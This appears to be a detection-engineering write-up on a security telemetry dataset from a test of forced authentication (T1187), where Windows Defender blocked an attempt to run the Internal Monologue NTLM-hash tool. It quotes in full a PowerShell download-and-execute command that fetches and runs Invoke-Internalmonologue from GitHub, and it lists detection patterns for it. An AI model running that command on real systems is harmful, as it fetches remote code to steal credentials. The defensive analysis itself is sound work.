# T1187-2: Forced Authentication — WinPwn - PowerSharpPack - Retrieving NTLM Hashes without Touching LSASS

## Technique Context

T1187 (Forced Authentication) involves adversaries forcing a system to authenticate to an attacker-controlled resource, typically to capture NTLM hashes for offline cracking or relay attacks. This technique is fundamental to Windows lateral movement, as it can harvest credentials without directly accessing LSASS or requiring elevated privileges in some cases. The detection community focuses on monitoring for suspicious authentication attempts to external systems, unusual network connections to non-domain resources, and tools that manipulate authentication protocols. This specific test attempts to use Internal Monologue, a tool designed to retrieve NTLM hashes by forcing local authentication without touching LSASS memory directly.

## What This Dataset Contains

The dataset captures a PowerShell-based attempt to download and execute the Internal Monologue tool from the PowerSharpPack repository. The Security channel shows the process creation chain: an initial PowerShell process (PID 8160) spawning a child PowerShell process (PID 7420) with the command line `"powershell.exe" & {iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Internalmonologue.ps1'); Invoke-Internalmonologue -command \""-Downgrade true -impersonate true -restore true\""}`. 

Sysmon captures the network activity, including a DNS query for `raw.githubusercontent.com` (EID 22) and the process access events (EID 10) showing PowerShell accessing the whoami.exe process with full access rights (0x1FFFFF). The PowerShell channel contains the critical evidence: the actual malicious script download attempt via `New-Object net.webclient` and the subsequent blocking by Windows Defender with the error "This script contains malicious content and has been blocked by your antivirus software" (EID 4100, 4103).

The dataset also shows privilege escalation activities with Security EID 4703 documenting extensive privilege enablement including SeAssignPrimaryTokenPrivilege, SeSecurityPrivilege, and SeBackupPrivilege.

## What This Dataset Does Not Contain

The dataset lacks the successful execution of Internal Monologue itself because Windows Defender blocked the malicious script before execution. Consequently, there are no authentication events showing forced NTLM authentication attempts, no evidence of credential harvesting, and no network connections to attacker-controlled authentication endpoints that would characterize successful T1187 execution. The blocking occurs at the PowerShell script level, so we don't see the lower-level Windows authentication APIs being manipulated or any LSA-related process interactions that Internal Monologue would typically generate. Additionally, there are no Sysmon ProcessCreate events for the actual Internal Monologue binary since the sysmon-modular config's include-mode filtering doesn't capture it, and it never executed due to the AV block.

## Assessment

This dataset provides excellent telemetry for detecting attempted T1187 execution via PowerShell-based tooling, particularly for detection engineers focused on early-stage prevention. The combination of command-line logging (Security 4688), PowerShell script block logging (4104), and Sysmon network/process monitoring creates multiple detection opportunities. However, the dataset's value is limited for understanding the full attack chain since Windows Defender successfully prevented execution. For building detections of successful T1187 techniques, additional datasets showing unblocked execution would be necessary. The privilege escalation evidence and process access patterns provide valuable context for understanding the tool's intended capabilities.

## Detection Opportunities Present in This Data

1. PowerShell script download from suspicious domains - detect `downloadstring` method calls to raw.githubusercontent.com or similar code-hosting platforms in PowerShell script blocks
2. Internal Monologue tool signatures - monitor for "Invoke-Internalmonologue" function names and characteristic command-line parameters like "-Downgrade", "-impersonate", "-restore"
3. Suspicious process access patterns - alert on PowerShell processes accessing other processes with full access rights (0x1FFFFF), particularly targeting authentication-related processes
4. Privilege escalation sequences - detect unusual privilege enablement combinations including SeAssignPrimaryTokenPrivilege and SeSecurityPrivilege within PowerShell processes
5. PowerShell network activity correlation - flag PowerShell processes making external network connections followed by script execution attempts
6. Windows Defender malicious content blocks - monitor PowerShell error messages indicating AV blocking for "malicious content" as potential attack indicators
7. DNS queries to code repositories from system processes - detect DNS resolution for githubusercontent.com, pastebin.com, or similar platforms from unexpected processes
